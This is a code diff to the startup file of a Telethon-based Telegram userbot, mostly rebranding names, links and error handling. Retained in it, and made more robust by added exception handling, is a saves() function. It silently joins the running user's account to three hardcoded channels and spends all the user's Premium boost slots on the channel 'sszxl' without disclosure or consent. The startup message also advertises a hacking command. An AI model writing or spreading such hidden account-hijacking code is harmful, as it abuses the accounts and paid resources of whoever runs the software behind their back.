@@ -1,4 +1,4 @@
-import aiohttp
+import time
 import asyncio
 import glob
 import os
@@ -29,7 +29,6 @@ from .pluginmanager import load_module
 from .tools import create_supergroup
 LOGS = logging.getLogger("VIPABH")
 logging.getLogger('telethon').setLevel(logging.WARNING)
-##Reda hands here
 cmdhr = Config.COMMAND_HAND_LER
 bot = ABH
 ENV = bool(os.environ.get("ENV", False))
@@ -94,9 +93,9 @@ async def startupmessage():
         if BOTLOG:
             Config.CATUBLOGO = await ABH.tgbot.send_file(
                 BOTLOG_CHATID,
-                "https://t.me/VIPABH/1187",
+                "https://t.me/MemeSoundJep/24",
                 caption="**‏᯽︙ بــوت الجوكر يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
-                buttons=[(Button.url("ابـ،ـن،هـ.ـاشـ.ـم ✘", "https://t.me/k_4x1"),)],
+                buttons=[(Button.url("سورس الجوكر", "https://t.me/jepthon"),)],
             )
     except Exception as e:
         LOGS.error(e)
@@ -126,17 +125,15 @@ async def startupmessage():
         LOGS.error(e)
         return None
 
+
 async def mybot():
     try:
         starkbot = await ABH.tgbot.get_me()
-        joker = "ABH 🤡"
+        joker = "الجوكر 🤡"
         bot_name = starkbot.first_name
-        bot_username = starkbot.username
-        botname = f"@{bot_username}" if bot_username else "Unknown Bot"
-
+        botname = f"@{starkbot.username}"
         if bot_name.endswith("Assistant"):
             print("تم تشغيل البوت")
-        
         if starkbot.bot_inline_placeholder:
             print("Aljoker ForEver")
         else:
@@ -148,40 +145,38 @@ async def mybot():
                 await ABH.send_message("@BotFather", joker)
                 await asyncio.sleep(2)
             except Exception as e:
-                print(f"Error during inline configuration: {e}")
+                print(e)
     except Exception as e:
-        print(f"Error in mybot: {e}")
+        print(e)
+
 
 async def add_bot_to_logger_group(chat_id):
+    """
+    To add bot to logger groups
+    """
+    bot_details = await ABH.tgbot.get_me()
     try:
-        bot_details = await ABH.tgbot.get_me()
-        bot_username = bot_details.username
-        if not bot_username:
-            raise ValueError("اسم المستخدم للبوت غير موجود")
-        try:
-            await ABH(
-                functions.messages.AddChatUserRequest(
-                    chat_id=chat_id,
-                    user_id=bot_username,
-                    fwd_limit=1000000,
-                )
+        await ABH(
+            functions.messages.AddChatUserRequest(
+                chat_id=chat_id,
+                user_id=bot_details.username,
+                fwd_limit=1000000,
             )
-            print(f"تمت إضافة البوت إلى المجموعة: {chat_id}")
-        except Exception:
+        )
+    except BaseException:
+        try:
             await ABH(
                 functions.channels.InviteToChannelRequest(
                     channel=chat_id,
-                    users=[bot_username],
+                    users=[bot_details.username],
                 )
             )
-            print(f"تمت دعوة البوت إلى القناة: {chat_id}")
-    except Exception as e:
-        print(f"Error in add_bot_to_logger_group: {e}")
-        LOGS.error(str(e))
+        except Exception as e:
+            LOGS.error(str(e))
 VIPABH = {"@sszxl", "@x04ou", "@iamMUAOL"}
 async def saves():
     for lMl10l in VIPABH:
-        
+        try:
             await ABH(JoinChannelRequest(channel=lMl10l))
             result = await ABH(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
@@ -192,12 +187,19 @@ async def saves():
                     break
             if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
                 continue
-            if len(slots) == 0:
+            if not slots:
                 return
             await ABH(functions.premium.ApplyBoostRequest(
                 'sszxl',
                 slots=slots
             ))
+        except FloodWaitError as e:
+            continue
+        except OverflowError:
+            LOGS.error("Getting Overflow Error from Telegram. Script is stopping now. Please try again after some time.")
+            continue
+        except ChannelPrivateError:
+            continue
 async def load_plugins(folder, extfolder=None):
     """
     تحميل ملفات السورس
@@ -257,7 +259,6 @@ async def load_plugins(folder, extfolder=None):
             f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
         )
 
-#سورس الجوكر عمك
 async def aljoker_the_best(ABH, group_name):
     async for dialog in ABH.iter_dialogs():
         if dialog.is_group and dialog.title == group_name:
